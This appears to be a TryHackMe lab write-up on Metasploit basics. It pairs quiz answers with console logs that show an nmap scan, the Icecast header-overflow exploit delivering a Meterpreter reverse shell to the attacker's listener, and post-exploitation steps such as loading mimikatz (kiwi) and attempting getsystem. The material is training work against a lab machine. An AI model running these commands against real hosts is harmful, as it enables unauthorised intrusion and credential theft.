msf6 > getg lport
lport => 

msf6 > spool /tmp/console.log
[*] Spooling to file /tmp/console.log...
msf6 > banner

      .:okOOOkdc'           'cdkOOOko:.
    .xOOOOOOOOOOOOc       cOOOOOOOOOOOOx.
   :OOOOOOOOOOOOOOOk,   ,kOOOOOOOOOOOOOOO:
  'OOOOOOOOOkkkkOOOOO: :OOOOOOOOOOOOOOOOOO'
  oOOOOOOOO.    .oOOOOoOOOOl.    ,OOOOOOOOo
  dOOOOOOOO.      .cOOOOOc.      ,OOOOOOOOx
  lOOOOOOOO.         ;d;         ,OOOOOOOOl
  .OOOOOOOO.   .;           ;    ,OOOOOOOO.
   cOOOOOOO.   .OOc.     'oOO.   ,OOOOOOOc
    oOOOOOO.   .OOOO.   :OOOO.   ,OOOOOOo
     lOOOOO.   .OOOO.   :OOOO.   ,OOOOOl
      ;OOOO'   .OOOO.   :OOOO.   ;OOOO;
       .dOOo   .OOOOocccxOOOO.   xOOd.
         ,kOl  .OOOOOOOOOOOOO. .dOk,
           :kk;.OOOOOOOOOOOOO.cOk:
             ;kOOOOOOOOOOOOOOOk:
               ,xOOOOOOOOOOOx,
                 .lOOOOOOOl.
                    ,dOd,
                      .

       =[ metasploit v6.2.26-dev                          ]
+ -- --=[ 2264 exploits - 1189 auxiliary - 404 post       ]
+ -- --=[ 951 payloads - 45 encoders - 11 nops            ]
+ -- --=[ 9 evasion                                       ]

Metasploit tip: When in a module, use back to go 
back to the top level prompt
Metasploit Documentation: https://docs.metasploit.com/

┌──(witty㉿kali)-[/tmp]
└─$ more console.log
[*] Spooling to file /tmp/console.log...
msf6 > banner

      .:okOOOkdc'           'cdkOOOko:.
    .xOOOOOOOOOOOOc       cOOOOOOOOOOOOx.
   :OOOOOOOOOOOOOOOk,   ,kOOOOOOOOOOOOOOO:
  'OOOOOOOOOkkkkOOOOO: :OOOOOOOOOOOOOOOOOO'
  oOOOOOOOO.    .oOOOOoOOOOl.    ,OOOOOOOOo
  dOOOOOOOO.      .cOOOOOc.      ,OOOOOOOOx
  lOOOOOOOO.         ;d;         ,OOOOOOOOl
  .OOOOOOOO.   .;           ;    ,OOOOOOOO.
   cOOOOOOO.   .OOc.     'oOO.   ,OOOOOOOc
    oOOOOOO.   .OOOO.   :OOOO.   ,OOOOOOo
     lOOOOO.   .OOOO.   :OOOO.   ,OOOOOl
      ;OOOO'   .OOOO.   :OOOO.   ;OOOO;
       .dOOo   .OOOOocccxOOOO.   xOOd.
         ,kOl  .OOOOOOOOOOOOO. .dOk,
           :kk;.OOOOOOOOOOOOO.cOk:
             ;kOOOOOOOOOOOOOOOk:
               ,xOOOOOOOOOOOx,
                 .lOOOOOOOl.
                    ,dOd,
                      .

       =[ metasploit v6.2.26-dev                          ]
+ -- --=[ 2264 exploits - 1189 auxiliary - 404 post       ]
+ -- --=[ 951 payloads - 45 encoders - 11 nops            ]
+ -- --=[ 9 evasion                                       ]

Metasploit tip: When in a module, use back to go 
back to the top level prompt
Metasploit Documentation: https://docs.metasploit.com/

msf6 > 

I get it :)

msf6 > tips

   Id  Tip
   --  ---
   0   View all productivity tips with the tips command
   1   Enable verbose logging with set VERBOSE true
   2   When in a module, use back to go back to the top level prompt
   3   Tired of setting RHOSTS for modules? Try globally setting it with setg RHOSTS x.x.x.
       x
   4   Enable HTTP request and response logging with set HttpTrace true
   5   You can upgrade a shell to a Meterpreter session on many platforms using sessions -u
        <session_id>
   6   Open an interactive Ruby terminal with irb
   7   Use the resource command to run commands from a file
   8   To save all commands executed since start up to a file, use the makerc command
   9   View advanced module options with advanced
   10  You can use help to view all available commands
   11  Use help <command> to learn more about any command
   12  View a module's description using info, or the enhanced version in your browser with
        info -d
   13  After running db_nmap, be sure to check out the result of hosts and services
   14  Save the current environment with the save command, future console restarts will use
        this environment again
   15  Search can apply complex filters such as search cve:2009 type:exploit, see all the f
       ilters with help search
   16  Metasploit can be configured at startup, see msfconsole --help to learn more
   17  Display the Framework log using the log command, learn more with help log
   18  Adapter names can be used for IP params set LHOST eth0
   19  Use sessions -1 to interact with the last opened session
   20  View missing module options with show missing
   21  Start commands with a space to avoid saving them to history
   22  You can pivot connections over sessions started with the ssh_login modules
   23  Use the analyze command to suggest runnable modules for hosts
   24  Set the current module's RHOSTS with database values using hosts -R or services -R
   25  Writing a custom module? After editing your module, why not try the reload command
   26  Use the edit command to open the currently active module in your editor

msf6 > save
Saved configuration to: /home/witty/.msf4/config

msf6 > set lhost 10.8.19.103
lhost => 10.8.19.103
msf6 > set lport 4444
lport => 4444
msf6 > save
Saved configuration to: /home/witty/.msf4/config

┌──(witty㉿kali)-[~/.msf4]
└─$ cat config 
[framework/core]
lhost=10.8.19.103
lport=4444

[framework/features]

[framework/ui/console]

```


Let's go ahead and start exploring the help menu. On the Metasploit prompt (where we'll be at after we start Metasploit using msfconsole), type the command: `help`

 Completed

The help menu has a very short one-character alias, what is it?

*?*

Finding various modules we have at our disposal within Metasploit is one of the most common commands we will leverage in the framework. What is the base command we use for searching?

*search*

Once we've found the module we want to leverage, what command we use to select it as the active module?

*use*

How about if we want to view information about either a specific module or just the active one we have selected?

*info*

Metasploit has a built-in netcat-like function where we can make a quick connection with a host simply to verify that we can 'talk' to it. What command is this?

*connect*

Entirely one of the commands purely utilized for fun, what command displays the motd/ascii art we see when we start msfconsole (without -q flag)?

The art we see at the start of of msfconsole is called a 'banner'

*banner*

We'll revisit these next two commands shortly, however, they're two of the most used commands within Metasploit. First, what command do we use to change the value of a variable?

*set*

Metasploit supports the use of global variables, something which is incredibly useful when you're specifically focusing on a single box. What command changes the value of a variable globally? 

*setg*

Now that we've learned how to change the value of variables, how do we view them? There are technically several answers to this question, however, I'm looking for a specific three-letter command which is used to view the value of single variables.

This has a global option similar to how set has set and setg

*get*

How about changing the value of a variable to null/no value?

This is also very similar to set

*unset*

When performing a penetration test it's quite common to record your screen either for further review or for providing evidence of any actions taken. This is often coupled with the collection of console output to a file as it can be incredibly useful to grep for different pieces of information output to the screen. What command can we use to set our console output to save to a file?

*spool*

Leaving a Metasploit console running isn't always convenient and it can be helpful to have all of our previously set values load when starting up Metasploit. What command can we use to store the settings/active datastores from Metasploit to a settings file? This will save within your msf4 (or msf5) directory and can be undone easily by simply removing the created settings file.

*save*


### Modules for Every Occasion!

Metasploit consists of six core modules that make up the bulk of the tools you will utilize within it. Let's take a quick look through the various modules, their purposes, and some of the commands associated with modules. 

![](https://i.imgur.com/iYuiWvP.png)

_*Note, this diagram includes both the interfaces and *most* of the modules. This diagram does not include the 'Post' module._ 

Answer the questions below

Easily the most common module utilized, which module holds all of the exploit code we will use?

*Exploit*

Used hand in hand with exploits, which module contains the various bits of shellcode we send to have executed following exploitation?

*Payload*

Which module is most commonly used in scanning and verification machines are exploitable? This is not the same as the actual exploitation of course.

*Auxiliary*

One of the most common activities after exploitation is looting and pivoting. Which module provides these capabilities?

See my note below the image above

*Post*

Commonly utilized in payload obfuscation, which module allows us to modify the 'appearance' of our exploit such that we may avoid signature detection?

*Encoder*

Last but not least, which module is used with buffer overflow and ROP attacks?

*NOP*

Not every module is loaded in by default, what command can we use to load different modules?

This can be found within the msfconsole help command output

```
msf6 > load -l
[*] Available Framework plugins:
    * lab
    * aggregator
    * session_notifier
    * request
    * wiki
    * besecure
    * openvas
    * sounds
    * beholder
    * thread
    * event_tester
    * sample
    * db_credcollect
    * wmap
    * session_tagger
    * nexpose
    * libnotify
    * nessus
    * token_adduser
    * pcap_log
    * db_tracker
    * ips_filter
    * socket_logger
    * capture
    * msfd
    * sqlmap
    * alias
    * rssfeed
    * token_hunter
    * msgrpc
    * auto_add_route
    * ffautoregen

msf6 > load -s

```

*load*

### Move that shell!

 Start Machine

Remember that database we set up? In this step, we're going to take a look at what we can use it for and exploit our victim while we're at it!

As you might have noticed, up until this point we haven't touched nmap in this room, let alone perform much recon on our victim box. That'll all change now as we'll take a swing at using nmap within Metasploit. **Go ahead and deploy the box now, it may have up to a three-minute delay for starting up our target vulnerable service.** 

_*Note, Metasploit does support different types of port scans from within the auxiliary modules. **Metasploit can also import other scans from nmap and Nessus just to name a few.**_  

Answer the questions below

```
msf6 > db_nmap -sV 10.10.89.131
[*] Nmap: Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-28 12:53 EST
[*] Nmap: Stats: 0:01:11 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
[*] Nmap: Service scan Timing: About 41.67% done; ETC: 12:55 (0:00:48 remaining)
[*] Nmap: Nmap scan report for 10.10.89.131
[*] Nmap: Host is up (0.27s latency).
[*] Nmap: Not shown: 987 closed tcp ports (conn-refused)
[*] Nmap: PORT      STATE    SERVICE            VERSION
[*] Nmap: 125/tcp   filtered locus-map
[*] Nmap: 135/tcp   open     msrpc              Microsoft Windows RPC
[*] Nmap: 139/tcp   open     netbios-ssn        Microsoft Windows netbios-ssn
[*] Nmap: 445/tcp   open     microsoft-ds       Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
[*] Nmap: 3389/tcp  open     ssl/ms-wbt-server?
[*] Nmap: 5357/tcp  open     http               Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
[*] Nmap: 8000/tcp  open     http               Icecast streaming media server
[*] Nmap: 49152/tcp open     msrpc              Microsoft Windows RPC
[*] Nmap: 49153/tcp open     msrpc              Microsoft Windows RPC
[*] Nmap: 49154/tcp open     msrpc              Microsoft Windows RPC
[*] Nmap: 49158/tcp open     msrpc              Microsoft Windows RPC
[*] Nmap: 49159/tcp open     msrpc              Microsoft Windows RPC
[*] Nmap: 49160/tcp open     msrpc              Microsoft Windows RPC
[*] Nmap: Service Info: Host: DARK-PC; OS: Windows; CPE: cpe:/o:microsoft:windows
[*] Nmap: Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
[*] Nmap: Nmap done: 1 IP address (1 host up) scanned in 162.62 seconds

┌──(witty㉿kali)-[/tmp]
└─$ nmap 10.10.89.131 -p- --min-rate 5000
Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-28 12:57 EST
Warning: 10.10.89.131 giving up on port because retransmission cap hit (10).
Nmap scan report for 10.10.89.131
Host is up (0.20s latency).
Not shown: 49765 closed tcp ports (conn-refused), 15761 filtered tcp ports (no-response)
PORT      STATE SERVICE
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
3389/tcp  open  ms-wbt-server
5357/tcp  open  wsdapi
49153/tcp open  unknown
49154/tcp open  unknown
49159/tcp open  unknown
49160/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 69.80 seconds

msf6 > services
Services
========

host          port   proto  name               state     info
----          ----   -----  ----               -----     ----
10.10.89.131  125    tcp    locus-map          filtered
10.10.89.131  135    tcp    msrpc              open      Microsoft Windows RPC
10.10.89.131  139    tcp    netbios-ssn        open      Microsoft Windows netbios-ssn
10.10.89.131  445    tcp    microsoft-ds       open      Microsoft Windows 7 - 10 microsoft
                                                         -ds workgroup: WORKGROUP
10.10.89.131  3389   tcp    ssl/ms-wbt-server  open
10.10.89.131  5357   tcp    http               open      Microsoft HTTPAPI httpd 2.0 SSDP/U
                                                         PnP
10.10.89.131  8000   tcp    http               open      Icecast streaming media server
10.10.89.131  49152  tcp    msrpc              open      Microsoft Windows RPC
10.10.89.131  49153  tcp    msrpc              open      Microsoft Windows RPC
10.10.89.131  49154  tcp    msrpc              open      Microsoft Windows RPC
10.10.89.131  49158  tcp    msrpc              open      Microsoft Windows RPC
10.10.89.131  49159  tcp    msrpc              open      Microsoft Windows RPC
10.10.89.131  49160  tcp    msrpc              open      Microsoft Windows RPC


MSRPC stands for Microsoft Remote Procedure Call, which is a protocol used for interprocess communication (IPC) between distributed systems in a network. MSRPC is based on the RPC protocol, which allows a process to execute a code in another process or machine without requiring the developer to explicitly manage the communication details.

In Microsoft Windows, MSRPC is a critical component of the Distributed Component Object Model (DCOM), which enables communication between components running on different machines in a network. DCOM uses MSRPC to manage the communication between client and server components, allowing applications to share data and resources across the network.

MSRPC is also used in the implementation of some network protocols, such as the Server Message Block (SMB) protocol used for file sharing in Windows networks. MSRPC provides a secure and reliable way to transfer data and commands between networked systems, while also providing authentication and encryption mechanisms to protect against unauthorized access and eavesdropping.

msf6 > hosts

Hosts
=====

address       mac  name  os_name  os_flavor  os_sp  purpose  info  comments
-------       ---  ----  -------  ---------  -----  -------  ----  --------
10.10.89.131             Unknown                    device

msf6 > vulns

Vulnerabilities
===============

Timestamp  Host  Name  References
---------  ----  ----  ----------

msf6 > use icecast
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp

Matching Modules
================

   #  Name                                 Disclosure Date  Rank   Check  Description
   -  ----                                 ---------------  ----   -----  -----------
   0  exploit/windows/http/icecast_header  2004-09-28       great  No     Icecast Header Overwrite


Interact with a module by name or index. For example info 0, use 0 or use exploit/windows/http/icecast_header

[*] Using exploit/windows/http/icecast_header
msf6 exploit(windows/http/icecast_header) > 

msf6 exploit(windows/http/icecast_header) > info 0

       Name: Icecast Header Overwrite
     Module: exploit/windows/http/icecast_header
   Platform: Windows
       Arch: 
 Privileged: No
    License: Metasploit Framework License (BSD)
       Rank: Great
  Disclosed: 2004-09-28

Provided by:
  spoonm <spoonm@no$email.com>
  Luigi Auriemma <aluigi@autistici.org>

Available targets:
  Id  Name
  --  ----
  0   Automatic

Check supported:
  No

Basic options:
  Name    Current Setting  Required  Description
  ----    ---------------  --------  -----------
  RHOSTS                   yes       The target host(s), see https://github.com/rapid7/meta
                                     sploit-framework/wiki/Using-Metasploit
  RPORT   8000             yes       The target port (TCP)

Payload information:
  Space: 2000
  Avoid: 3 characters

Description:
  This module exploits a buffer overflow in the header parsing of 
  icecast versions 2.0.1 and earlier, discovered by Luigi Auriemma. 
  Sending 32 HTTP headers will cause a write one past the end of a 
  pointer array. On win32 this happens to overwrite the saved 
  instruction pointer, and on linux (depending on compiler, etc) this 
  seems to generally overwrite nothing crucial (read not exploitable). 
  This exploit uses ExitThread(), this will leave icecast thinking the 
  thread is still in use, and the thread counter won't be decremented. 
  This means for each time your payload exits, the counter will be 
  left incremented, and eventually the threadpool limit will be maxed. 
  So you can multihit, but only till you fill the threadpool.

References:
  https://nvd.nist.gov/vuln/detail/CVE-2004-1561
  OSVDB (10406)
  http://www.securityfocus.com/bid/11271
  http://archives.neohapsis.com/archives/bugtraq/2004-09/0366.html


View the full module info with the info -d command.

msf6 exploit(windows/http/icecast_header) > search multi/handler

Matching Modules
================

   #  Name                                                 Disclosure Date  Rank       Check  Description
   -  ----                                                 ---------------  ----       -----  -----------
   0  exploit/linux/local/apt_package_manager_persistence  1999-03-09       excellent  No     APT Package Manager Persistence
   1  exploit/android/local/janus                          2017-07-31       manual     Yes    Android Janus APK Signature bypass
   2  auxiliary/scanner/http/apache_mod_cgi_bash_env       2014-09-24       normal     Yes    Apache mod_cgi Bash Environment Variable Injection (Shellshock) Scanner
   3  exploit/linux/local/bash_profile_persistence         1989-06-08       normal     No     Bash Profile Persistence
   4  exploit/linux/local/desktop_privilege_escalation     2014-08-07       excellent  Yes    Desktop Linux Password Stealer and Privilege Escalation
   5  exploit/multi/handler                                                 manual     No     Generic Payload Handler
   6  exploit/windows/mssql/mssql_linkcrawler              2000-01-01       great      No     Microsoft SQL Server Database Link Crawling Command Execution
   7  exploit/windows/browser/persits_xupload_traversal    2009-09-29       excellent  No     Persits XUpload ActiveX MakeHttpRequest Directory Traversal
   8  exploit/linux/local/yum_package_manager_persistence  2003-12-17       excellent  No     Yum Package Manager Persistence


Interact with a module by name or index. For example info 8, use 8 or use exploit/linux/local/yum_package_manager_persistence

msf6 exploit(windows/http/icecast_header) > use 5
[*] Using configured payload generic/shell_reverse_tcp

msf6 exploit(multi/handler) > set PAYLOAD windows/meterpreter/reverse_tcp
PAYLOAD => windows/meterpreter/reverse_tcp

msf6 exploit(multi/handler) > set LHOST 10.8.19.103
LHOST => 10.8.19.103

msf6 exploit(multi/handler) > show options

Module options (exploit/multi/handler):

   Name  Current Setting  Required  Description
   ----  ---------------  --------  -----------


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, th
                                        read, process, none)
   LHOST     10.8.19.103      yes       The listen address (an interface may
                                        be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Wildcard Target



View the full module info with the info, or info -d command.

msf6 exploit(multi/handler) > use icecast
[*] Using configured payload windows/meterpreter/reverse_tcp

Matching Modules
================

   #  Name                                 Disclosure Date  Rank   Check  Description
   -  ----                                 ---------------  ----   -----  -----------
   0  exploit/windows/http/icecast_header  2004-09-28       great  No     Icecast Header Overwrite


Interact with a module by name or index. For example info 0, use 0 or use exploit/windows/http/icecast_header

[*] Using exploit/windows/http/icecast_header
msf6 exploit(windows/http/icecast_header) > set RHOSTS 10.10.89.131
RHOSTS => 10.10.89.131
msf6 exploit(windows/http/icecast_header) > show options

Module options (exploit/windows/http/icecast_header):

   Name    Current Setting  Required  Description
   ----    ---------------  --------  -----------
   RHOSTS  10.10.89.131     yes       The target host(s), see https://github.
                                      com/rapid7/metasploit-framework/wiki/Us
                                      ing-Metasploit
   RPORT   8000             yes       The target port (TCP)


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, th
                                        read, process, none)
   LHOST     10.8.19.103      yes       The listen address (an interface may
                                        be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic



View the full module info with the info, or info -d command.

msf6 exploit(windows/http/icecast_header) > run -j
[*] Exploit running as background job 0.
[*] Exploit completed, but no session was created.

[*] Started reverse TCP handler on 10.8.19.103:4444 
msf6 exploit(windows/http/icecast_header) > [*] Sending stage (175686 bytes) to 10.10.89.131
[*] Meterpreter session 1 opened (10.8.19.103:4444 -> 10.10.89.131:49249) at 2023-02-28 13:56:15 -0500

msf6 exploit(windows/http/icecast_header) > jobs

Jobs
====

No active jobs.

msf6 exploit(windows/http/icecast_header) > sessions

Active sessions
===============

  Id  Name  Type                  Information           Connection
  --  ----  ----                  -----------           ----------
  1         meterpreter x86/wind  Dark-PC\Dark @ DARK-  10.8.19.103:4444 -> 1
            ows                   PC                    0.10.89.131:49249 (10
                                                        .10.89.131)


msf6 exploit(windows/http/icecast_header) > sessions -i 1
[*] Starting interaction with 1...

meterpreter > help

Core Commands
=============

    Command                   Description
    -------                   -----------
    ?                         Help menu
    background                Backgrounds the current session
    bg                        Alias for background
    bgkill                    Kills a background meterpreter script
    bglist                    Lists running background scripts
    bgrun                     Executes a meterpreter script as a background t
                              hread
    channel                   Displays information or control active channels
    close                     Closes a channel
    detach                    Detach the meterpreter session (for http/https)
    disable_unicode_encoding  Disables encoding of unicode strings
    enable_unicode_encoding   Enables encoding of unicode strings
    exit                      Terminate the meterpreter session
    get_timeouts              Get the current session timeout values
    guid                      Get the session GUID
    help                      Help menu
    info                      Displays information about a Post module
    irb                       Open an interactive Ruby shell on the current s
                              ession
    load                      Load one or more meterpreter extensions
    machine_id                Get the MSF ID of the machine attached to the s
                              ession
    migrate                   Migrate the server to another process
    pivot                     Manage pivot listeners
    pry                       Open the Pry debugger on the current session
    quit                      Terminate the meterpreter session
    read                      Reads data from a channel
    resource                  Run the commands stored in a file
    run                       Executes a meterpreter script or Post module
    secure                    (Re)Negotiate TLV packet encryption on the sess
                              ion
    sessions                  Quickly switch to another session
    set_timeouts              Set the current session timeout values
    sleep                     Force Meterpreter to go quiet, then re-establis
                              h session
    ssl_verify                Modify the SSL certificate verification setting
    transport                 Manage the transport mechanisms
    use                       Deprecated alias for "load"
    uuid                      Get the UUID for the current session
    write                     Writes data to a channel


Stdapi: File system Commands
============================

    Command       Description
    -------       -----------
    cat           Read the contents of a file to the screen
    cd            Change directory
    checksum      Retrieve the checksum of a file
    cp            Copy source to destination
    del           Delete the specified file
    dir           List files (alias for ls)
    download      Download a file or directory
    edit          Edit a file
    getlwd        Print local working directory
    getwd         Print working directory
    lcat          Read the contents of a local file to the screen
    lcd           Change local working directory
    lls           List local files
    lpwd          Print local working directory
    ls            List files
    mkdir         Make directory
    mv            Move source to destination
    pwd           Print working directory
    rm            Delete the specified file
    rmdir         Remove directory
    search        Search for files
    show_mount    List all mount points/logical drives
    upload        Upload a file or directory


Stdapi: Networking Commands
===========================

    Command       Description
    -------       -----------
    arp           Display the host ARP cache
    getproxy      Display the current proxy configuration
    ifconfig      Display interfaces
    ipconfig      Display interfaces
    netstat       Display the network connections
    portfwd       Forward a local port to a remote service
    resolve       Resolve a set of host names on the target
    route         View and modify the routing table


Stdapi: System Commands
=======================

    Command       Description
    -------       -----------
    clearev       Clear the event log
    drop_token    Relinquishes any active impersonation token.
    execute       Execute a command
    getenv        Get one or more environment variable values
    getpid        Get the current process identifier
    getprivs      Attempt to enable all privileges available to the current p
                  rocess
    getsid        Get the SID of the user that the server is running as
    getuid        Get the user that the server is running as
    kill          Terminate a process
    localtime     Displays the target system local date and time
    pgrep         Filter processes by name
    pkill         Terminate processes by name
    ps            List running processes
    reboot        Reboots the remote computer
    reg           Modify and interact with the remote registry
    rev2self      Calls RevertToSelf() on the remote machine
    shell         Drop into a system command shell
    shutdown      Shuts down the remote computer
    steal_token   Attempts to steal an impersonation token from the target pr
                  ocess
    suspend       Suspends or resumes a list of processes
    sysinfo       Gets information about the remote system, such as OS


Stdapi: User interface Commands
===============================

    Command        Description
    -------        -----------
    enumdesktops   List all accessible desktops and window stations
    getdesktop     Get the current meterpreter desktop
    idletime       Returns the number of seconds the remote user has been idl
                   e
    keyboard_send  Send keystrokes
    keyevent       Send key events
    keyscan_dump   Dump the keystroke buffer
    keyscan_start  Start capturing keystrokes
    keyscan_stop   Stop capturing keystrokes
    mouse          Send mouse events
    screenshare    Watch the remote user desktop in real time
    screenshot     Grab a screenshot of the interactive desktop
    setdesktop     Change the meterpreters current desktop
    uictl          Control some of the user interface components


Stdapi: Webcam Commands
=======================

    Command        Description
    -------        -----------
    record_mic     Record audio from the default microphone for X seconds
    webcam_chat    Start a video chat
    webcam_list    List webcams
    webcam_snap    Take a snapshot from the specified webcam
    webcam_stream  Play a video stream from the specified webcam


Stdapi: Audio Output Commands
=============================

    Command       Description
    -------       -----------
    play          play a waveform audio file (.wav) on the target system


Priv: Elevate Commands
======================

    Command       Description
    -------       -----------
    getsystem     Attempt to elevate your privilege to that of local system.


Priv: Password database Commands
================================

    Command       Description
    -------       -----------
    hashdump      Dumps the contents of the SAM database


Priv: Timestomp Commands
========================

    Command       Description
    -------       -----------
    timestomp     Manipulate file MACE attributes


```

Metasploit comes with a built-in way to run nmap and feed it's results directly into our database. Let's run that now by using the command `db_nmap -sV MACHINE_IP`

You can add a '-vv' flag to this if you're impatient like me and like to see results


What service does nmap identify running on **port 135?**

You might have to run the command 'services' to see the results of the scan again here.

*msrpc*

Let's go ahead and see what information we have collected in the database. Try typing the command `hosts` into the msfconsole now.

 Completed

How about something else from the database, try the command `services` now.

 Completed

One last thing, try the command `vulns` now. This won't show much at the current moment, however, it's worth noting that Metasploit will keep track of discovered vulnerabilities. One of the many ways the database can be leveraged quickly and powerfully. 

 Completed

Now that we've scanned our victim system, let's try connecting to it with a Metasploit payload. First, we'll have to search for the target payload. In Metasploit 5 (the most recent version at the time of writing) you can simply type `use` followed by a unique string found within only the target exploit. For example, try this out now with the following command `use icecast`. What is the full path for our exploit that now appears on the msfconsole prompt? *This will include the exploit section at the start

*exploit/windows/http/icecast_header*

While that use command with the unique string can be incredibly useful that's not quite the exploit we want here. Let's now run the command `search multi/handler`.

Go ahead and run the command `use NUMBER_NEXT_TO  exploit/multi/handler` wherein the number will be what appears in that far left column (typically this will be 4 or 5). In this way, we can use our search results without typing out the full name/path of the module we want to use.

---

What is the name of the column on the far left side of the console that shows up next to 'Name'?  

*#*

Now type the command `use NUMBER_FROM_PREVIOUS_QUESTION`. This is the short way to use modules returned by search results. 

 Completed

Next, let's set the payload using this command `set PAYLOAD windows/meterpreter/reverse_tcp`. In this way, we can modify which payloads we want to use with our exploits. Additionally, let's run this command `set LHOST YOUR_IP_ON_TRYHACKME`. You might have to check your IP using the command `ip addr`, it will likely be your **tun0** interface.

 Completed

Let's go ahead and return to our previous exploit, run the command `use icecast` to select it again.

 Completed

One last step before we can run our exploit. Run the command `set RHOSTS MACHINE_IP` to tell Metasploit which target to attack.

 Completed

Once you're set those variables correctly, run the exploit now via either the command `exploit` or the command `run -j` to run this as a job.  

 Completed

Once we've started this, we can check all of the jobs running on the system by running the command `jobs`  

 Completed

After we've established our connection in the next task, we can list all of our sessions using the command `sessions`. Similarly, we can interact with a target session using the command `sessions -i SESSION_NUMBER`  

 Completed


### We're in, now what?

Now that we've got a shell into our victim machine, let's take a look at several post-exploitation modules actions we can leverage! **Most of the questions in the following section can be answered by using the Meterpreter help menu which can be accessed through the 'help' command. This menu dynamically expands as we load more modules.**

Answer the questions below

```
meterpreter > ps

Process List
============

 PID   PPID  Name         Arch  Session  User          Path
 ---   ----  ----         ----  -------  ----          ----
 0     0     [System Pro
             cess]
 4     0     System
 416   4     smss.exe
 496   692   svchost.exe
 544   536   csrss.exe
 584   692   svchost.exe
 596   536   wininit.exe
 604   584   csrss.exe
 652   584   winlogon.ex
             e
 692   596   services.ex
             e
 700   596   lsass.exe
 708   596   lsm.exe
 820   692   svchost.exe
 888   692   svchost.exe
 936   692   svchost.exe
 1064  692   svchost.exe
 1200  692   svchost.exe
 1312  496   dwm.exe      x64   1        Dark-PC\Dark  C:\Windows\System32\dw
                                                       m.exe
 1332  1296  explorer.ex  x64   1        Dark-PC\Dark  C:\Windows\explorer.ex
             e                                         e
 1384  692   spoolsv.exe
 1412  692   svchost.exe
 1468  692   taskhost.ex  x64   1        Dark-PC\Dark  C:\Windows\System32\ta
             e                                         skhost.exe
 1560  820   WmiPrvSE.ex
             e
 1580  692   amazon-ssm-
             agent.exe
 1660  692   LiteAgent.e
             xe
 1696  692   svchost.exe
 1848  692   Ec2Config.e
             xe
 2040  692   svchost.exe
 2268  1332  Icecast2.ex  x86   1        Dark-PC\Dark  C:\Program Files (x86)
             e                                         \Icecast2 Win32\Icecas
                                                       t2.exe
 2328  692   vds.exe
 2412  692   sppsvc.exe
 2568  692   TrustedInst
             aller.exe
 2604  692   SearchIndex
             er.exe
 2784  820   slui.exe     x64   1        Dark-PC\Dark  C:\Windows\System32\sl
                                                       ui.exe

meterpreter > migrate 1384
[*] Migrating from 2268 to 1384...
[-] Error running command migrate: Rex::RuntimeError Cannot migrate into this process (insufficient privileges)

meterpreter > getuid
Server username: Dark-PC\Dark

meterpreter > sysinfo
Computer        : DARK-PC
OS              : Windows 7 (6.1 Build 7601, Service Pack 1).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 2
Meterpreter     : x86/windows

meterpreter > load -l
bofloader
espia
extapi
incognito
kiwi
lanattacks
peinjector
powershell
priv
python
sniffer
stdapi
unhook
winpmem

meterpreter > load kiwi
Loading extension kiwi...
  .#####.   mimikatz 2.2.0 20191125 (x86/windows)
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'        Vincent LE TOUX            ( vincent.letoux@gmail.com )
  '#####'         > http://pingcastle.com / http://mysmartlogon.com  ***/

[!] Loaded x86 Kiwi on an x64 architecture.

Success.

meterpreter > getsystem

[-] priv_elevate_getsystem: Operation failed: 691 The following was attempted:
[-] Named Pipe Impersonation (In Memory/Admin)
[-] Named Pipe Impersonation (Dropper/Admin)
[-] Token Duplication (In Memory/Admin)
[-] Named Pipe Impersonation (RPCSS variant)
[-] Named Pipe Impersonation (PrintSpooler variant)
[-] Named Pipe Impersonation (EFSRPC variant - AKA EfsPotato)

meterpreter > getprivs

Enabled Process Privileges
==========================

Name
----
SeChangeNotifyPrivilege
SeIncreaseWorkingSetPrivilege
SeShutdownPrivilege
SeTimeZonePrivilege
SeUndockPrivilege

meterpreter > pwd
C:\Program Files (x86)\Icecast2 Win32
meterpreter > upload creds.txt
[*] uploading  : /home/witty/Downloads/creds.txt -> creds.txt
[*] Uploaded 21.00 B of 21.00 B (100.0%): /home/witty/Downloads/creds.txt -> creds.txt
[*] uploaded   : /home/witty/Downloads/creds.txt -> creds.txt

meterpreter > help

Core Commands
=============

    Command                   Description
    -------                   -----------
    ?                         Help menu
    background                Backgrounds the current session
    bg                        Alias for background
    bgkill                    Kills a background meterpreter script
    bglist                    Lists running background scripts
    bgrun                     Executes a meterpreter script as a background thread
    channel                   Displays information or control active channels
    close                     Closes a channel
    detach                    Detach the meterpreter session (for http/https)
    disable_unicode_encoding  Disables encoding of unicode strings
    enable_unicode_encoding   Enables encoding of unicode strings
    exit                      Terminate the meterpreter session
    get_timeouts              Get the current session timeout values
    guid                      Get the session GUID
    help                      Help menu
    info                      Displays information about a Post module
    irb                       Open an interactive Ruby shell on the current session
    load                      Load one or more meterpreter extensions
    machine_id                Get the MSF ID of the machine attached to the session
    migrate                   Migrate the server to another process
    pivot                     Manage pivot listeners
    pry                       Open the Pry debugger on the current session
    quit                      Terminate the meterpreter session
    read                      Reads data from a channel
    resource                  Run the commands stored in a file
    run                       Executes a meterpreter script or Post module
    secure                    (Re)Negotiate TLV packet encryption on the session
    sessions                  Quickly switch to another session
    set_timeouts              Set the current session timeout values
    sleep                     Force Meterpreter to go quiet, then re-establish session
    ssl_verify                Modify the SSL certificate verification setting
    transport                 Manage the transport mechanisms
